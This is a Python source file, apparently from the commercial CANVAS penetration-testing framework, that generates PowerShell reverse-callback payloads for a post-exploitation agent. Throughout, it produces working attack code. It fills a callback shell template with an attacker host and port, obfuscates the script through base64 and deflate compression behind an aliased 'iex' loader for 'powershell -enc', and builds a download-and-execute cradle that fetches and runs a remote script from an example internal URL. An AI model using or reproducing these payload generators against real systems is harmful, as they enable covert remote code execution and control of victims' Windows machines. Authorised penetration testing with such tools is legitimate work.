#!/usr/bin/env python
# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2015
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import os
import base64
import zlib

class mosdef_powershell:
    def __init__(self, myexploit=None):
         self.callback_host     = "127.0.0.1"
         self.callback_port     = 5555
         self.mosdef_type       = 23
         self.mosdef_id         = 0
         self.conn_type         = 0
         self.tcp_callback_src  = "psMosdefTCPCallback.ps1"
         self.http_callback_src = ""
         self.use_ssl           = False
         self.callback_script   = ""
         self.ps_command        = ""

         if myexploit:
            if hasattr(myexploit, "callback"):
                self.callback_host = myexploit.callback.ip
                self.callback_port = myexploit.callback.port

            if hasattr(myexploit, "engine"):
                self.mosdef_id     = myexploit.engine.getNewMosdefID(myexploit)

            if hasattr(myexploit, "HTTPMOSDEF"):
                if myexploit.HTTPMOSDEF:
                    self.conn_type = "HTTP"
                else:
                    self.conn_type = "TCP"
            else:
                self.conn_type = "TCP"

    def setup(self, callback_host, callback_port, mosdef_type=0, mosdef_id=0, conn_type="TCP", use_ssl=False):
         self.callback_host = callback_host
         self.callback_port = callback_port
         self.mosdef_id = mosdef_id

         if mosdef_type == 0:
            self.mosdef_type = 23
         else:
            self.mosdef_type = mosdef_type

         if conn_type:
            self.conn_type = conn_type

         if use_ssl:
            self.use_ssl = True

    #
    # Create a TCP or HTTP Callback client.
    # Returns the powershell script.
    #
    def createMosdefCallback(self, conn_type="TCP"):
         local_src = os.path.join(os.path.dirname(__file__), 'src')

         if conn_type:
            self.conn_type = conn_type

         if self.conn_type == "TCP":
            fs = os.path.join(local_src, self.tcp_callback_src)
         elif self.conn_type == "HTTP":
            #fs = os.path.join(local_src,self.http_callback_src)
            raise BaseException, "HTTP Callback not implemented yet"
         else:
            self.conn_type = 0
            raise BaseException, "Not connection type supported"

         with open(fs) as f:
              content = f.read()

         content = content.replace( "#__CALLBACK_HOST__#" , self.callback_host )
         content = content.replace( "#__CALLBACK_PORT__#" , str(self.callback_port) )
         content = content.replace( "#__MOSDEF_TYPE__#" , "23" if self.mosdef_type == 0 else str(self.mosdef_type) )
         content = content.replace( "#__MOSDEF_ID__#" , str(self.mosdef_id) )

         f.close()
         self.callback_script = content
         return  self.callback_script

    #
    # Return the powershell callback script with base64 encoding
    # or cipher to use in several ways.
    #
    def getMosdefCallbackStream(self, base64encode=False, cipher=None):
        if base64encode:
            return base64.b64encode(self.callback_script)
        if cipher:
            #do something and return
            return self.callback_script

        return self.callback_script

    #
    # Create a command to execute in a powershell shell
    # The command could be plain text or base64 encoded
    #
    def generatePSCommand(self, b64encode=True, encoding="ASCII", compression=True, externalSource=""):
         if not self.callback_script:
            raise BaseException, "You must call createCallBack() first"

         #TODO:Compression
         memStream    = "$(New-Object IO.MemoryStream(,%s))"

         if b64encode:
            #b64Stream = "$([Convert]::FromBase64String('%s'))"
            b64Stream = "$([Convert]::FromBase64String(%s))"

         if encoding == "ASCII":
            encodingType = "[Text.Encoding]::ASCII"
         else:
            encodingType = "[Text.Encoding]::UTF8"

         # this sould be used when the payload is in a file previusly uploaded
         if externalSource:
            readFromFile = "(Get-Content '%s')" % externalSource
            # This didn't work with PowerShell version 2.0
            #readFromFile = "[IO.File]::ReadLines('%s')"%externalSource

         dataStream = ""
         if b64encode:
            if externalSource:
                dataStream = b64Stream % readFromFile
            else:
                b64data = base64.b64encode(self.callback_script)
                b64data = "'" + b64data + "'"
                dataStream = b64Stream % b64data
         else:
            dataStream = "$(%s.GetBytes('%s'))" % (encodingType, readFromFile if externalSource else self.callback_script)

         param1  = memStream % dataStream
         param2  = encodingType

         command = "iex $(New-Object IO.StreamReader(%s,%s)).ReadToEnd()"

         self.ps_command = command % (param1, param2)
         return self.ps_command
    
    #
    # Create a base64 encoded command to execute in a powershell shell
    # The result can be used like this "powershell -enc XXXXX"
    # Note: Compression only works on PS 4.0 and later
    #
    def generateEncPSCommand(self, encoding="ASCII",compression=True, externalSource=""):
         
         # this sould be used when the payload is in a file previusly uploaded
         if externalSource:
            readFromFile = "(Get-Content '%s')" % externalSource
            content      = readFromFile
         else:
            content      = self.callback_script

         #REMOVE THIS. THIS IS ONLY FOR TESTING
         #content = "$listener = [System.Net.Sockets.TcpListener]8888;$listener.start();$listener.AcceptTcpClient()"
         #content = "$a=\"hola\" | Out-file \"C:\Users\Hannibal\\anibal44.txt\""
        
         # compress and encode with base64 the content
         if compression:
            #ucontent = unicode(content).encode('utf-16le')
            #compressed_content = zlib.compress(ucontent)
            #use ascii content in order to reduce the size of the payload
            compressed_content = zlib.compress(content)
            #removing header and footer of the compressed package
            rawchunk = compressed_content[2:-4]
            #base64 enconding
            enc_chunk = base64.b64encode(rawchunk)
            #the "enc" parameter needs Unicode encoding
            #command = "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::Unicode)).ReadToEnd()" % enc_chunk
            command = "sal x New-Object;iex(x IO.StreamReader((x IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % enc_chunk

         else:
            #escaping the single quote for powershell
            content = content.replace("'","''")
            #the "enc" parameter needs Unicode encoding
            dataStream = "$([Text.Encoding]::Unicode.GetBytes('%s'))" % (unicode(content))
            command = "iex $(New-Object IO.StreamReader ($(New-Object IO.MemoryStream(,%s)),[Text.Encoding]::Unicode)).ReadToEnd()" % dataStream
         
         #Getting the bytearray from command (this is because powershell need it in this way in order to decode it and execute it)
         uc = unicode(command).encode('utf-16le')
         cbytes = bytearray()
         index = 0
         for byte in uc:
             cbytes.insert(index,ord(byte))
             index+=1

         return base64.b64encode(cbytes)


    #
    # Create a powershell command to download a remote script and execute it. 
    # You must serve the ps script in a HTTP server and pass the full url to
    # the method. ex. url: 'http://192.168.1.12:9090/script.ps1'. The result should be
    # used in this way : powershell -c COMMAND. You also can enconded and used in this
    # other way : powershell -enc ENC_COMMAND
    #
    def generateRequestRemotePSCommand(self, url=None, b64encode=True, extra_cmd=""):

        if not url:
            return None

        cmd = "iex (New-object Net.Webclient).downloadstring('%s')" % url
        pscommand = cmd
        
        #if id need to add more 
        if extra_cmd:
            pscommand+= ";%s" % extra_cmd

        if b64encode:   
            uc = unicode(pscommand).encode('utf-16le')
            cbytes = bytearray()
            index = 0
            for byte in uc:
                cbytes.insert(index,ord(byte))
                index+=1
            
            pscommand = base64.b64encode(cbytes)

        return pscommand

